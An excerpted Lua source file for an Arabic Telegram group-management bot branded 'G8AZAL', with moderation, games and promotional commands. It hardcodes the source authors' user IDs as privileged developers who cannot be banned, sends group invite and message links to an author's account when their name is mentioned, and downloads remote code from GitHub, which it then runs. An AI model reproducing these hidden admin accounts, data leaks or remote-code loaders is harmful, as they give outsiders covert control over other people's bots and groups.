...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━● :\na●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua G8AZAL.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━● :\na●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n\27[0;33;49m')
...
io.write('\27[1;31m ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━● ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./G8AZAL.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S G8AZAL -X kill
screen -S G8AZAL ./G8AZAL
done
]])  
file:close() 
...
token = sudos.token 
--- start functions ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/g8azal/Max/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1554085475,44444444444444,1993823358,1916366858}   
...
if tonumber(user_id) == tonumber(1554085475) then  
var = true 
elseif tonumber(user_id) == tonumber(1993823358) then
var = true  
elseif tonumber(user_id) == tonumber(44444444444444) then
var = true  
...
local UserName = (data.username_ or "G8AZAAL")
...
local G8AZAL_Msg = ''  
if msgs < 100 then 
G8AZAL_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
G8AZAL_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
G8AZAL_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
G8AZAL_Msg = 'متفاعل' 
elseif msgs < 1200 then 
G8AZAL_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
G8AZAL_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
G8AZAL_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
G8AZAL_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
G8AZAL_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
G8AZAL_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
G8AZAL_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
G8AZAL_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
G8AZAL_Msg = 'رب التفاعل'  
end 
return G8AZAL_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼˹《♡ 𝙂8𝘼𝙕𝘼𝙇 ♡》˼")  
...
function plugin_G8AZAL(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.G8AZAL and msg then
pre_msg = plugin.G8AZAL(msg)
end
end
end
...
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
function SourceG8AZAL(msg,data) -- بداية العمل
if msg then
...
Namebot = G8AZAL_Msg[math.random(#G8AZAL_Msg)] 
...
local Text = [[ 
 ⦿ من أحسن السورسات على التليجرام سورس غزال ⦿
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '˹『 𝙂8𝘼𝙕𝘼𝙇 』˼', url="t.me/Ghazal_Source"}}, 
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/G8AZALL/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if DevSoFi(msg) then
local bl = '[⁨⌯𝙶𝙷𝙰𝚉𝙰𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 🦌🏴‍☠️⇣](t.me/Ghazal_Source)'
local keyboard = {
...
if text == 'ده 🌚💞' or text == 'العوده 🌚💞' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local Text = ' ⦿تم ارسال الملصق من ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n - '..Name
...
send(msg.chat_id_, msg.id_,G8AZAL_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf G8AZAL.lua')
os.execute('wget https://raw.githubusercontent.com/g8azal/Max/main/G8AZAL.lua')
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⦿ اصدار سورس غزال{ 3x⦿}')
end
if text == '●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس غزال ادخل وتابع الجديد](t.me/Ghazal_Source)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '『 𝙂8𝘼𝙕𝘼𝙇 』', url="t.me/Ghazal_Source"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Ghazal_Source/2107' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس غزال ادخل وتابع الجديد](t.me/Ghazal_Source)
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/Ghazal_Source)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/Ghazal_Source"}}, 
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
send(msg.chat_id_, msg.id_,' ⦿  عدد الجروبات الان  ↜:↝ '..#group..' ↜'..G8AZALk..''..G8AZAL..'\n ⦿  الان عدد الجروبات الحقيقي  ↜:↝ '..sendok..' ↜ جروبات\n')   
end
end
end,nil)
end
...
local G8AZAL1_Msg = database:get(bot_id.."G8AZAL1:Add:Filter:Rp2"..text..msg.chat_id_)   
if G8AZAL1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
if text and text:match("^صاصا$") or text and text:match("^المبرمج صاصا$") or text and text:match("^sasa$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1554085475,"هناك شخص يريدك يا سيدي صاصا 🕊🇨🇵 \n🧞‍♂الشخص  {"..Name.."}\n🧞‍♂اسم الجروب {"..NameChat.."}\n🧞‍♂ايدي الجروب { `"..msg.chat_id_.."` }\n🧞‍♂رابط الجروب \n [ "..LinkGroup.." ]\n    🧞‍♂رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^غزال$") or text and text:match("^حازم$") or text and text:match("^gazal$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1916366858,"هناك شخص يريدك يا سيدي غزال🌚❤️🦌  \n🧞‍♂الشخص  {"..Name.."}\n🧞‍♂اسم الجروب {"..NameChat.."}\n🧞‍♂ايدي الجروب { `"..msg.chat_id_.."` }\n🧞‍♂رابط الجروب \n [ "..LinkGroup.." ]\n    🧞‍♂رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "غزال")
...
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
if G8AZAL_Msg and not Special(msg) then  
local G8AZAL_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if G8AZAL_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⦿ الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⦿ ["..G8AZAL_Msg.."] \n")
else
send(msg.chat_id_,0," ⦿ الـعـضو  : {["..data.first_name_.."](T.ME/G8AZAAL)}\n ⦿ ["..G8AZAL_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⦿ عذرا  ↜:{["..data.first_name_.."](T.ME/G8AZAAL)}\n ⦿ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."G8AZAL:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."G8AZAL:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."G8AZAL:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."G8AZAL:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."G8AZAL:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."G8AZAL:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."G8AZAL:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."G8AZAL:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."G8AZAL:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."G8AZAL:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."G8AZAL:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."G8AZAL:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."G8AZAL:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, " ⦿ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "G8AZAAL")..")\n ⦿ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."G8AZAL:teh"..msg.chat_id_).."} بجانب اسمك\n ⦿ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local G8AZALChengName = database:get(bot_id.."G8AZAL:Cheng:Name"..data.id_)
if not data.first_name_ then 
if G8AZALChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..G8AZALChengName..']')
database:del(bot_id.."G8AZAL:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if G8AZALChengName ~= data.first_name_ then 
local Text = {
  "جان اسمك خوش اسم ",
"ليش غيرت اسمك يحلو ",
"هذا لحلو غير اسمه ",
...
database:set(bot_id.."G8AZAL:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local G8AZALChengUserName = database:get(bot_id.."G8AZAL:Cheng:UserName"..data.id_)
if not data.username_ then 
if G8AZALChengUserName then 
send(msg.chat_id_, msg.id_, 1, "مسح معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..G8AZALChengUserName..']')
database:del(bot_id.."G8AZAL:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if G8AZALChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."G8AZAL:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local G8AZALChengPhoto = database:get(bot_id.."G8AZAL:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if G8AZALChengPhoto then 
send(msg.chat_id_, msg.id_, "مسح كل صوره الحلو 😂👌🏻")
database:del(bot_id.."G8AZAL:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if G8AZALChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."G8AZAL:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
local Text = [[
╭━❲₪[🧞ѕᴏụʀᴄᴇ ɢ8ᴀᴢᴀʟ🧞](t.me/Ghazal_Source)₪❳━╮
[Wᴇʟᴄᴏᴍᴇ ᴛᴏ ʙᴇѕᴛ ѕᴏụʀᴄᴇ](t.me/Ghazal_Source)
[ѕᴏụʀᴄᴇ ɢ8ᴀᴢᴀʟ ʙᴇѕᴛ ᴏғ ᴛʜᴇ ʙᴇѕᴛ](t.me/Ghazal_Source)
╰━❲₪[🧞ѕᴏụʀᴄᴇ ɢ8ᴀᴢᴀʟ🧞](t.me/Ghazal_Source)₪❳━╯

[🧞 ✹ 𝐃𝐄𝐕 𝐆8𝐀𝐙𝐀𝐋 ✹ 🧞](t.me/G8AZAAL)

[🧞 ✹ 𝐃𝐄𝐕 𝐒𝐀𝐒𝐀✹ 🧞](t.me/S_A_S_A_1)

[🧞 ✹ 𝐃𝐄𝐕 𝐁𝐎𝐆𝐘✹ 🧞](t.me/BOT3Dark)
]] 
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✹ 𝐌𝐘 𝐃𝐄𝐕 ✹', callback_data="/units"},{text = '✹ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ✹', callback_data="/theytry"}},   
{{text = '🧞 ✹ مــطــور الــبــوت ✹ 🧞', url="http://t.me/"..sudos.UserName}},
{{text = '🧞 ✹ اضغط لاضافه البوت لمجموعتك ✹ 🧞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/G8AZALL/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'غزال' or text == 'حازم' or text == 'مالك السورس'   then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ 𝙶8𝙰𝚉𝙰𝙻 𖡼
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐃𝐄𝐕 𝐆8𝐀𝐙𝐀𝐋 ✹ 🧞',url="t.me/G8AZAAL"}},
{{text = '🧞🦌 تــــواصــــل الــــســـورس 🦌🧞',url="t.me/G_82_bot"}},
{{text = '✹ الــقــنــوات ✹', callback_data="/Ajobanf"},{text = '✹ الــبــارات ✹', callback_data="/banfai"}},  
{{text = '✹ الــبــوتــات ✹', callback_data="/gqjik"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/G8AZALL/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'صاصا' or text == 'sasa' or text == 'المبرمج صاصا'   then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ 𝚂𝙰𝚂𝙰 𖡼
ᴛᴏ ᴄᴏᴍᴍụɴɪᴄᴀᴛᴇ ᴛᴏɢᴇᴛʜᴇʀ 𖡼
ғᴏʟʟᴏᴡ ᴛʜᴇ ʙụᴛᴛᴏɴѕ ʟᴏᴡᴇʀ 𖡼
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐃𝐄𝐕 𝐒𝐀𝐒𝐀✹ 🧞',url="t.me/S_A_S_A_1"}},
{{text = '✹ الــقــنــوات ✹', callback_data="/sasa_ch"},{text = '✹ الــبــارات ✹', callback_data="/sasa_p"}},  
{{text = '✹ الــبــوتــات ✹', callback_data="/sasa_b"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/G8AZALL/15&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'بوجي' or text == 'Bogy' or text == 'مطور السورس'   then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ 𝙱𝙾𝙶𝚈 𖡼
ᴛᴏ ᴄᴏᴍᴍụɴɪᴄᴀᴛᴇ ᴛᴏɢᴇᴛʜᴇʀ 𖡼
ғᴏʟʟᴏᴡ ᴛʜᴇ ʙụᴛᴛᴏɴѕ ʟᴏᴡᴇʀ 𖡼
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞 ✹ 𝐃𝐄𝐕 𝐁𝐎𝐆𝐘✹ 🧞',url="t.me/BOT3Dark"}},
{{text = '✹ الــقــنــوات ✹', callback_data="/bogy_ch"},{text = '✹ الــبــارات ✹', callback_data="/bogy_b"}},  
{{text = '✹ الــبــوتــات ✹', callback_data="/bogy_p"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/G8AZALL/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
"اكتب تاريخ مستحيل تنساه ",
  ...
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
   "لي سورس غزال رقم 1 علي التليجرام؟ ",
  "شيء مستحيل ترفضه ؟. ",
...
if text == 'سورس غزال' then
local Text = [[ 
 ⦿من أحسن السورسات على التليجرام سورس غزال ⦿
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ♡ 𝙂8𝘼𝙕𝘼𝙇 ♡](http://t.me/Ghazal_Source)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♡ 𝙂8𝘼𝙕𝘼𝙇 ♡》 ', url="t.me/G8AZAAL"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/G8AZALL/11&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/joooooookl/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'التواصل'  then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL g8azal](t.me/G8AZAAL)
[TWL bogy](t.me/BOT3Dark)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♡ 𝙂8𝘼𝙕𝘼𝙇 ♡》', url="t.me/Ghazal_Source"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Ghazal_Source/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب غزال' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ⦿ اهلا في قائمه الالعاب المتطوره سورس غزال ⦿ 
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/G8AZALL/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
...
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local G8AZAAL = database:get(bot_id..'text:ch:user')
if G8AZAAL then
send(msg.chat_id_, msg.id_,'['..G8AZAAL..']')
else
...
if tonumber(result.sender_user_id_) == tonumber(44444444444444) then  
send(msg.chat_id_, msg.id_, "⚠️ بس يبابا دا مالك السورس ⚠️")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1993823358) then  
send(msg.chat_id_, msg.id_, "⚠️بس يبابا دا مطور السورس⚠️")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1554085475) then  
send(msg.chat_id_, msg.id_, "⚠️ بس يبابا دا المبرمج صاصا⚠️")
return false 
end
...
function(arg,data) 
usertext = '\n ⦿ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'G8AZAAL')..')'
...
if result.id_ == tonumber(44444444444444) then
send(msg.chat_id_, msg.id_, " ⦿ لا يمكنك حظر مطور السورس عام \n")
return false 
end
if result.id_ == tonumber(1993823358) then  
send(msg.chat_id_, msg.id_, "⚠️بس يابابا دا مطور السورس⚠️")
return false 
end
...
usertext = '\n ⦿ العضو ← ['..result.title_..'](t.me/'..(username or 'G8AZAAL')..')'
status  = '\n ⦿ تم حظره عام من {'..Groups..'} مجموعه'
texts = usertext..status
...
if tonumber(userid) == tonumber(44444444444444) then  
...
if tonumber(userid) == tonumber(1993823358) then  
send(msg.chat_id_, msg.id_, "⚠️بس يبابا دا مطور السورس⚠️")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(00000000000000) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم غزال عام لانه هكر 🌚😹")
return false 
end
...
if result.id_ == tonumber(1993823358) then
send(msg.chat_id_, msg.id_, " ⚠️بس يبابا دا مطور السورس \n")
return false 
end
if result.id_ == tonumber(1916366858) then
send(msg.chat_id_, msg.id_, " ⚠️ بس يبابا دا مالك السورس ⚠️ \n")
...
if tonumber(userid) == tonumber(1554085475) then  
send(msg.chat_id_, msg.id_, " ⦿ ⚠️بس يبابا دا المبرمج صاصا⚠️")
return false 
end
if tonumber(userid) == tonumber(1916366858) then  
send(msg.chat_id_, msg.id_, " ⚠️ بس يبابا دا مالك السورس ⚠️")
...
if tonumber(userid) == tonumber(1993823358) then  
send(msg.chat_id_, msg.id_, " ⚠️بس يا بابا دا مطور السورس⚠️")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/g8azal/Max/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⦿ اهلا بك في متجر ملفات غزال\n ⦿ ملفات السورس ●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n\n"
local TextE = "\n●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n ⦿ علامة تعني { ✔️ } ملف مفعل\n ⦿ علامة تعني { ✖ } ملف معطل\n ⦿ قناة سورس غزال●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\n".." ⦿ [اضغط هنا لدخول](t.me/G8AZAAL) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/g8azal/Max/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('G8AZAL.lua')  
else
send(msg.chat_id_, msg.id_," ⦿ عذرا الملف لايدعم سورس غزال\n") 
end
return false
end
...
if text == ("مسح قائمه غزال") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⦿ تم مسح قائمه غزال')
return false
end

if text == 'قائمه غزال' and Sudo(msg) then
...
function Function_G8AZAL(extra, result, success)
...
Reply_Status(msg,result.sender_user_id_,"reply","𖢅ٖ  تم ترقيته مساعد في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_G8AZAL, nil)
return false 
end
...
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"𖢅ٖ  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:del(bot_id.."msa3d:ban")
database:sadd(bot_id.."msa3d:ban", result.id_)
database:set(bot_id.."id:msa3d:ban", result.id_)
Reply_Status(msg,result.id_,"reply","𖢅ٖ  تم ترقيته مساعد في البوت")  
else
send(msg.chat_id_, msg.id_,"𖢅ٖ  لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_G8AZAL, nil)
return false 
end
...
Reply_Status(msg,userid,"reply","𖢅ٖ  تم ترقيته مساعد في البوت")  
return false 
end
if text == ("تنزيل المساعد") and SudoBot(msg) then
function Function_G8AZAL(extra, result, success)
local id = database:get(bot_id.."id:msa3d:ban")
Reply_Status(msg,id,"reply","𖢅ٖ  تم تنزيله من المساعد")  
database:del(bot_id.."msa3d:ban")
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⦿ الـعـضو   ↜:['..data.first_name_..'](t.me/'..(data.username_ or 'G8AZAAL')..')'
...
send(msg.chat_id_, msg.id_, t..'●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●\nاضغط علي الاسم ليتم نسخه\n●━•⦿•⟞⟦ ℻ 𝙂8𝘼𝙕𝘼𝙇 ℻ ⟧⟝•⦿•━●ٴ\n ⦿ ❲[˹《♡ 𝙂8𝘼𝙕𝘼𝙇 ♡》˼ ](t.me/Ghazal_Source)❳ ⦿ ')
end
...
database:set(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ⦿ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."G8AZAL1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."G8AZAL1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ⦿ تم منع الكلمه مع التحذير")  
database:del(bot_id.."G8AZAL1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."G8AZAL1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."G8AZAL1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."G8AZAL1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
